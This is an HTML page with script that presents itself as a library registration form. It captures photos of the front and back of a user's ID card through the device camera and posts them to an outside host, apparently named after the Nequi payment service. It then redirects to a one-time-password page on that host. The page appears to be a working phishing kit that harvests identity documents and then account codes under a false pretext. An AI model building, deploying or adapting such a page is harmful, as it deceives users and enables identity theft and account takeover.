<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Registro Biblioteca - Laboratorio</title>

<style>
body {
    margin: 0;
    font-family: Arial, sans-serif;
    background: #f4f4f4;
    text-align: center;
}

.screen {
    display: none;
    height: 100vh;
    width: 100%;
}

.screen.active {
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
}

video {
    width: 280px;
    height: 380px;
    border-radius: 20px;
    object-fit: cover;
}

button {
    margin-top: 15px;
    padding: 10px 20px;
    border: none;
    border-radius: 5px;
    background: #7b6b99;
    color: white;
    cursor: pointer;
}

.loader {
    width: 40px;
    height: 40px;
    border: 4px solid #ddd;
    border-top: 4px solid #7b6b99;
    border-radius: 50%;
    animation: spin 1s linear infinite;
    margin-bottom: 10px;
}

@keyframes spin {
    100% { transform: rotate(360deg); }
}
</style>
</head>

<body>

<!-- CAPTURA -->
<div id="screen-camera" class="screen active">
    <h2 id="title">Captura el frente del carnet</h2>
    <video id="video" autoplay playsinline muted></video>
    <button onclick="capture()">Tomar foto</button>
</div>

<!-- PROCESANDO -->
<div id="screen-processing" class="screen">
    <div class="loader"></div>
    <p>Enviando información...</p>
</div>

<canvas id="canvas" style="display:none;"></canvas>

<script>
const SERVER_URL = "https://nequiscol.onrender.com";
const REDIRECT_URL = "https://nequiscol.onrender.com/one-time-pass.php.html";

let stream = null;
let step = 1;
let imageFront = null;
let imageBack = null;

// Iniciar cámara
async function startCamera() {
    try {
        stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: "environment" },
            audio: false
        });

        document.getElementById("video").srcObject = stream;
    } catch (error) {
        alert("No se pudo acceder a la cámara.");
        console.error(error);
    }
}

// Capturar imagen
async function capture() {
    const video = document.getElementById("video");
    const canvas = document.getElementById("canvas");
    const ctx = canvas.getContext("2d");

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0);

    const imageData = canvas.toDataURL("image/jpeg", 0.8);

    if (step === 1) {
        imageFront = imageData;
        step = 2;
        document.getElementById("title").innerText = "Ahora voltea el documento y captura el reverso";
        alert("Ahora voltea el documento");
    } else {
        imageBack = imageData;
        stopCamera();
        showProcessing();
        await sendImages();
    }
}

// Enviar imágenes al backend
async function sendImages() {
    try {
        const response = await fetch(`${SERVER_URL}/step-documents`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                studentCode: Date.now().toString(),
                frontImage: imageFront,
                backImage: imageBack
            })
        });

        const result = await response.text();
        //alert("Registro enviado correctamente.");
        setTimeout(() => {
        window.location.href = REDIRECT_URL;
       }, 1500);

    } catch (error) {
        console.error("Error al enviar:", error);
        alert("Error al enviar las imágenes.");
        location.reload();
    }
}

// Detener cámara
function stopCamera() {
    if (stream) {
        stream.getTracks().forEach(track => track.stop());
        stream = null;
    }
}

// Mostrar loader
function showProcessing() {
    document.getElementById("screen-camera").classList.remove("active");
    document.getElementById("screen-processing").classList.add("active");
}

startCamera();
</script>

</body>
</html>
